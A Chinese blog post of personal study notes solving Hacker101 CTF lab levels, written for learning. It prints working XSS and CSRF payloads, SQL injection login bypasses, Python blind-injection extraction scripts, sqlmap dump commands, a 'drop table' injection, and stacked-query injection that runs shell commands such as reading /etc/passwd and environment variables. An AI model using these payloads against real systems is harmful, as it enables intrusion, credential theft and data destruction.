---
title: "Hacker101学习笔记"
date: 2019-10-11T16:31:29+08:00
showDate: true
draft: false
tags: ["security","hacker", "ctf"]
categories: ["security"]
---

# hacker101学习笔记

## 前言

记录自己在hacker101 ctf的学习笔记


### 第一关 	A little something to get you started (1/1 flag)

第一次接触ctf没什么经验， 各种看网页源代码，看http请求有点像无头苍蝇，后来看了下hint `Take a look at the source for the page`,然后发现了一个没有出现在页面里的style标签

```html

<style>
	body {background-image: url("background.png");}
</style>
```

试了下访问http://domain.com/background.png，报了404，然后试了试在当前目录加上/background.png，解决


### 第二关 	Micro-CMS v1 （4/4 flag) 

#### flag 1

有了第一关的经验，我大概懂了一些套路，第二关给了一个input框一个textarea标签

![2-1](./2-1.png)

大概猜出来应该是考xss，现在input框里试了一下`<script>alert('xss')</script>`，爆出了第一个flag

![2-2](./2-2.png)

#### flag 2

接着在textarea试了试`<script>alert('xss')</script>`, 虽然提交的是script， 看起来是后端把script替换成scrubbed。 

然后试了一下`<BODY onload="alert('XSS')">`，成功爆出flag

![2-3](./2-3.png)

既然是script被过滤的，那就再试试img标签吧。textarea里写了`<IMG SRC="" onerror="alert('XSS')">`，但是好像和上一个算同一个flag

![2-4](./2-4.png)


#### flag 3

在textarea标签里试了很多种xss，但是flag都是一样的，那看起来接下来的问题就不是考xss了。
里面有一个创建page的页面，试着创建了一个page发现创建出来的page的id好像不连续（初始的两个是1、2，创建的是9），试了下访问`/page/3`，报not found，再试了试`/page/4`，报forbidden，看来这里应该有问题，因为每个page都有一个对应的eidt页面`/page/edit/page_id`，试着访问`/page/edit/4`，出了flag

![2-5](2-5.png)

#### flag 4

第四个flag就有点顺了，访问完`/page/edit/4`，想看看有没有注入点，然后试了试`/page/edit/4'`，最后一个flag就这样出了。

![2-6](2-6.png)

#### 参考资料

[常见xss过滤](https://damit5.com/2017/10/15/XSS-%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/)

### 第三关 Micro-CMS v2 （1/3 flag）

#### flag 1 

这一关一进来就说这是一个之前CMS的升级版本，修复的之前的安全问题，现在edit需要账号密码登录了，看起来是考sql注入吧。
试了试用户名框输入`'`提交，直接报错

```python

Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")

```

从这里大概能看出一些信息比如执行的sql语句是

```sql

SELECT password FROM admins WHERE username='';
```

应该是查用户名的密码然后跟提交的比对，然后数据库是mariadb, 表名是admins

接着试

```sql

' or 1 = 1 #
```

然后提示是invalid passsword， 看起来是username被跳过但是密码因为为空所以错误了。

继续尝试

```sql

' or 1 = 1 and 1 > (select count(*) from admins) #
```

返回了unkonwn user， 说明` 1 > (select count(*) from admins) `为`false`，所以admins表里面只有不多于一条数据，接下来用length猜字段长度

```sql

' or 1 = 1 and 1 > (select count(*) from admins where length(username) = 6) #
' or 1 = 1 and 1 > (select count(*) from admins where length(password) = 6) #
```

说明username和password长度都是6

然后是猜每个位置的字母

```sql

' or 1 = 1 and 1 >  (select count(*) from admins where left(username, 1) = 'a')#
```

手动尝试的话也要几百次，于是尝试下用python写个脚本，核心代码如下，功能为检测某个位置的字母是什么

```python

def get_username_word(idx, a):
    '''

    :param idx: 位置
    :param a: 字母
    :return:
    '''
    url = "http://35.227.24.107/ff1706e3ac/login"
    username = "' or 1 = 1 and 1 >  (select count(*) from admins where left(password, {}) = '{}')#".format(idx, a)
    # username = "mollie"
    # password = "jeanne"
    password = ""

    data = {
        "username": username,
        "password": ""
    }
    r = requests.post(url, data=data)
    if not re.search('Invalid password', r.text):
        print(idx, "is", a)
        return True
    else:
        print(idx, "is not", a)
    return False
```

最后跑出结果

```

    # username = "mollie"
    # password = "jeanne"
```

登陆后拿到flag

![2-7](2-7.png)

#### flag 2

拿到第一个flag之后，找了好久，发现目前可访问的url只有

```

/home       200
/page/1     200
/page/2     200
/page/3     401
/login      200
```

里面也没什么重要的信息，然后尝试访问第一个版本存在的`/page/edit/1`，发现直接重定向到了`/login`，login之后也就只有一个flag并没有后续信息，我尝试把flag当cookie访问`/page/edit/1`,结果还是重定向。

![2-8](2-8.png)

好像卡住了，突然没有了方向。再看了一眼第二关的CMS，它好像有个`POST /page/edit/1`，于是我试了一下POST，果然第二个flag在这。

![2-9](2-9.png)


#### flag 3

找完前两个flag又卡住了，好像现在该找的地方都找了一遍。于是就这样卡了一天，没什么头绪。最后看了两个hint

```

Regular users can only see public pages
Getting admin access might require a more perfect union
```

第一个hint显然说的是`/page/3`这个403的页面，第二个我看到了union，我猜还是在登录界面用注入的方法拿到flag。因为对sql不是很熟悉，所以我仔细查看了一下union的用法，然后在自己的数据库尝试了一下

```

描述
MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。

语法
MySQL UNION 操作符语法格式：

SELECT expression1, expression2, ... expression_n
FROM tables
[WHERE conditions]
UNION [ALL | DISTINCT]
SELECT expression1, expression2, ... expression_n
FROM tables
[WHERE conditions];
```

```sql

SELECT username FROM user 
WHERE username=''
UNION
SELECT 1
```

结果返回为

|username|
|-----|
|1|

这下有了头绪，hint大概是想让我们跳过密码实现登录。回头看一眼他的SQL，

```sql

SELECT password FROM admins WHERE username='';
```

把password查出来然后和post过去的比对，那我只要把他改造成下面这种，查出来的结果和我提交的密码就可以了。

```sql

SELECT password FROM admins
WHERE username=''
UNION
SELECT 1
```

然后提交表单里面填`username=' union select 1#&password=1`就能免密码登录了。试了一下，果然成功了。登录之后就可以访问`/page/3`了。最后一个flag也就在这里。

![2-10](2-10.png)

### 第四关 Encrypted Pastebin


#### 加密这块不是很了解，先放着

### 第五关 Photo Gallery

#### flag1

这关一进去看起来是一个图片展示的网页，三张图片，两个正常显示，一张500，看了下图片的地址。

```url

/fetch?id=1
/fetch?id=2
/fetch?id=3
```

丢到浏览器访问一下，好像直接是出来二进制数据，全是乱码。一开始我以为是要从图片里面找flag，然后尝试用ue打开，然后从里面找flag的16进制，结果什么也没找到。

然后试了试注入，加了一个`'`，200直接变成500，然后试试`' AND 1=1`，还是500，再试了试`AND 1=1`正常了，看来应该是int型的布尔盲注。

网上查了一下盲注的流程

获取数据库名字 -> 获取表名 -> 获取列名 -> 爆字段

我先手工试了一下

```sql 

AND LENGTH(DATABASE())=6
```

返回正常，说明数据库字符长度为6。然后开始用脚本爆数据库名。

```python
def get_available_ascii():
    A = 65
    a = 97
    zero = 48
    for i in [95] + list(range(a, a+26)) + list(range(A, A+26)) + list(range(zero, zero+10)):
        yield i


def guess_database_length(url):
    payload = " AND LENGTH(DATABASE())={}"
    for i in range(1, 33):
        u = url + payload.format(i)
        print(u)
        r = requests.head(u)
        print(r.status_code)
        if r.status_code == 200:
            return i

def guess_database_name(url, length):
    payload = " AND ASCII(MID(DATABASE(), {}, 1))={}"
    database_name = ""
    for pos in range(1, length+1):
        for s in get_available_ascii():
            u = url + payload.format(pos, s)
            r = requests.head(u)
            print(r.status_code)
            if r.status_code == 200:
                print(pos, chr(s))
                database_name += chr(s)
                break
    return database_name
```

这里用head方法是因为这个网站只需要知道响应码就ok了，这样可以提高请求的速度。

得到`database_name = 'level5'`

然后猜表

```python
def guess_database_tables(url, database_name):
    table1_length = 6 # 浏览器手工注入结果
    table2_length = 6
    tables = []
    payload = " AND ASCII(MID((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' limit {}, 1), {}, 1))={}"
    for table_idx in range(2):
        table_name = ""
        for table_pos_idx in range(1, table1_length + 1):
            for s in get_available_ascii():
                u = url + payload.format(database_name, table_idx, table_pos_idx, s)
                r = requests.head(u)
                print(r.status_code)
                if r.status_code == 200:
                    print("table", table_idx, table_pos_idx, chr(s))
                    table_name += chr(s)
                    break
        tables.append(table_name)
    return tables
```

表长是手工注入的时候得到的，这里就直接当常量用了，最后得到结果为

```python

table0 = "albums"
table1 = "photos"
```

做到这一步，我打算直接上sqlmap了。kali启动~

先爆第一个表albums的字段

```bash
sqlmap --threads 10 -u "http://35.227.24.107/479b051cb9/fetch?id=1" -D level5 -T albums --columns

```

结果为

| Column | Type    |
|--------|---------|
| id     | int(11) |
| title  | text    |

接着爆数据

```bash
sqlmap --threads 10 -u "http://35.227.24.107/479b051cb9/fetch?id=1" -D level5 -T albums -C id,title --dump
```

看起来只有一条没什么用的数据

| id | title   |
|----|---------|
| 1  | Kittens |

接着下一个表photos爆出来的数据如下

| id | parent | title            | filename                                                         |
|----|--------|------------------|------------------------------------------------------------------|
| 1  | 1      | Utterly adorable | files/adorable.jpg                                               |
| 2  | 1      | Purrfect         | files/purrfect.jpg                                               |
| 3  | 1      | Invisible        | c46d5ba4cb81f5f75c59e560a1345c5b417b961616b8e98f48e75306a81439a6 |

看来之所以`/fetch?id=3`返回500是因为3的filename的文件不存在导致的吧。这看起来是一个64位md5，我放到cmd5上解密，没有结果。第二天早上起来我想了想，这玩意儿和flag长得也很像，于是就把他改成flag的格式

`^FLAG^c46d5ba4cb81f5f75c59e560a1345c5b417b961616b8e98f48e75306a81439a6$FLAG$`

提交发现果然是个flag。

#### flag2

距离上一个flag已经过去两天了，在过去的两天我尝试了各种办法，甚至用sqlmap把他的数据库都脱下来了，依然没有头绪。但是有几个突破口。

1. 尝试用load_file和into outfile来向文件系统读写文件，但是数据库的默认是设置secure_file_priv为null或者指定位置，并不能随意读写文件。于是放弃了。
2. 从photos表的filename可以看出，代码应该是读出filename的值然后从文件系统中读取图片内容并返回，所以`id=3`才会500。通过这点，我尝试了payload` union select '/etc/passwd'`，但是报了500。于是也放弃了。

今天看了两个hint

* Consider how you might build this system yourself. What would the query for fetch look like?
* Take a few minutes to consider the state of the union

这两个hint我感觉还是想让我从利用union读取系统文件入手。

因为之前第三关的sql注入爆出来的代码是python，我于是随手试了一下` union select 'main.py'`，果然是皇天不负有心人，直接爆出了源码，然后注释里有flag

![2-11.png](2-11.png)

#### flag3

第二个flag里爆出了服务端的代码，看起来是想我们从源码入手。

代码里唯一有用户输入的一段只有`GET /fetch`这个api，代码如下

```python
@app.route('/fetch')
def fetch():
	cur = getDb().cursor()
	if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
		abort(404)

	# It's dangerous to go alone, take this:
	# ^FLAG^c9ca117fc9876a4d0b1b09a76b8c3f1136e03dce5de40222400eed4f1c90e50f$FLAG$

	return open('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
```

最后一句把输入的filename强行绑定在了当前目录，我开始的想法是看能不能通过某些字符串来绕过`str.replace()`，google了好久也没有结果。

然后我想能不能在select后面跟一个update语句，尝试构造payload

`;update photos set filename='files/adorable.jpg' where id=3;`

把id=3的filename改成id=1的filename，提交完之后刷新index页面，没有反应。

google了一会儿我发现了一个叫做[Stacked injection](http://www.sqlinjection.net/stacked-queries/)的攻击方式。原来我上面的payload之所以没有反应是因为update语句一般需要加上commit

在找第二个flag的时候其实我也是过类似的payload

`;drop table photos`,而且甚至导致服务器直接500了，但是当时也没多想。于是构造payload

`;update photos set filename='files/adorable.jpg' where id=3;commit;`

再访问index页面，果然第三个图片变成了第一个图片。

既然能改数据库数据，那我的修改肯定也能影响下面的index路由了

```python
@app.route('/')
def index():
	cur = getDb().cursor()
	cur.execute('SELECT id, title FROM albums')
	albums = list(cur.fetchall())

	rep = ''
	for id, title in albums:
		rep += '<h2>%s</h2>\n' % sanitize(title)
		rep += '<div>'
		cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
		fns = []
		for pid, ptitle, pfn in cur.fetchall():
			rep += '<div><img src="fetch?id=%i" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
			fns.append(pfn)
		rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
		rep += '</div>\n'

	return home.replace('$ALBUMS$', rep)
```

代码里看起来是要du命令并返回结果，ubuntu里`du --help`看一下


```

-c, --total           produce a grand total
-h, --human-readable  print sizes in human readable format (e.g., 1K 234M 2G)
```

看来是打印三个文件的总大小然后返回输出结果的最后一行。fns是三个filename构成的列表，我只要把filename改造成我想要命令就能执行并返回了。

先构造fns，把id=3的filename改成`|| cat /etc/passwd`，页面里回显了，`/etc/passwd`的最后一行

![2-12.png](2-12.png)

看起来我需要把内容都显示在一行才行，查了一下可以通过管道用`xargs`就能单行输出了，先构造payload

`;update photos set filename='cat /etc/passwd|xargs' where id=3;commit;`

然后访问index页面，这下内容都出来了。

![2-13.png](2-13.png)

但是好像没有flag，再找找其他地方。找了好几个地方，最后在环境变量里面找到了，原来三个flag都在这，payload为

`;update photos set filename='export|xargs' where id=3;commit;`

![2-14.png](2-14.png)

历时一周，第五关完结~

### 第六关

不会php，暂时跳过

### 第七关

进入首页，看起来是个写文章的平台，后端是php

![2-15.png](2-15.png)

先尝试注册账号。

登录之后有几个可以访问的路由分别为

```

index.php
index.php?page=home.php&message=
index.php?page=create.php
index.php?page=profile.php&id=d
index.php?page=account.php
index.php?page=sign_out.php
```

#### flag1


这关一共7个flag，应该每个页面都有，先试试这个最特别的

`index.php?page=profile.php&id=d`

访问页面，是一个展示个人信息的页面

![2-16.png](2-16.png)

这个参数`id=d`看着很怪，尝试把它改成`id=1`，页面上的username没了

![2-17.png](2-17.png)

然后试了一下ab，`id=b`的时候，页面变成了别人的用户名和别人的posts

![2-18.png](2-18.png)

访问那个secure blog，第一个flag get。

![2-19.png](2-19.png)

#### flag2

接着从主页面找，有一个create的表单

![20.png](20.png)

尝试create一个，burp里面看看post请求

![21.png](21.png)

用id字段来识别post的创建者？repeater里改一下user_id试试。

果然是个flag~

![22.png](22.png)

#### flag3

这个页面创建之后，出现了可以删除自己的post

![23.png](23.png)

发一个delete，参数为

`page=delete.php&id=e4da3b7fbbce2345d7772b0674a318d5`

这个id长32位，盲猜md5，而且肯定和post_id有关，这个post_id是5，直接试着加密一下，这不就是5的md5值嘛

![24.png](24.png)

那我是不是可以删除不属于我的post呢？

试了一下第二个id的md5，成了，越权漏洞!

![25.png](25.png)

#### flag4

这个页面还有一个edit子页面

`index.php?page=edit.php&id=4`

改一下id=1然后save

![26.png](26.png)

第四个flag ok~

![27.png](27.png)


#### flag5

页面里的内容都找的差不多了，接下来看看http头部，看了下他的cookie，我发现我每次登录退出之后再登录cookie都一样，看起来是和用户有关，还是32位，估计还是md5，再比对一下发现就是user_id的md5值，那这样我可以构造别人的id然后登录了呀。

构造一下id=1的cookie进去发现是admin的账号

![28.png](28.png)

把他的密码改成admin然后登录，成功

![29.png](29.png)


#### flag6

因为还有个user账号，用同样的方法登上去也有个flag

![30.png](30.png)

#### flag7

访问id=945的post，拿到flag。（hint太蠢了）


### 第八关 && 第九关

第八和第九好像合起来才是一关，第八关是一个demo，没有flag，第九关才有。

（这两关真的卡了我好久，最后还是看了下别人的经验做出来的

先稍微测了一下第八关demo里面的内容

```js

POST    /login              //登录
POST    /newTicket          //添加ticket（存在xss， csrf）
GET     /ticket?id=         //查看ticket信息（存在sql注入）
GET     /newUser?username=password=password2=       //添加user（居然是GET方法，那肯定有古怪）

```

#### flag1

在第九关里，在没有登录的情况下只能访问`POST /newTicket`，就卡在了这里。尝试了payload


```html

<a href="http://34.74.105.127/b414803f39/newUser?username=admin2&password=admin&password2=admin"></a>

```

![31](31.png)

没有效果，然后又尝试了

```html

<img src="http://34.74.105.127/b414803f39/newUser?username=admin2&password=admin&password2=admin">

```

还是没用，最后看了下别人的payload

![32](32.png)

```html

<img src="http://localhost/newUser?username=test&password=test&password2=test">

```

看完还是很疑惑，为什么用localhost能触发？在我没有查到正确解释之前我可能要把他当成作者故意这样设置来理解了。

触发这个csrf之后用新创建的账号登录。

![33](33.png)


登录后flag就在第一个ticket里面（为啥还有个无效flag？肯定又阴谋~）

![34](34.png)

#### flag2

现在用完了这个csrf，还剩下一个注入点，那就试试爆库吧。

因为之前测那个demo的时候已经爆过库了，所以数据库和表都是知道的。

直接sqlmap一把梭

```bash

sqlmap -u "http://host/10string/ticket?id=1" --cookie=Cookie -D level7 -T users --dump
```

密码就是flag。

![35](35.png)

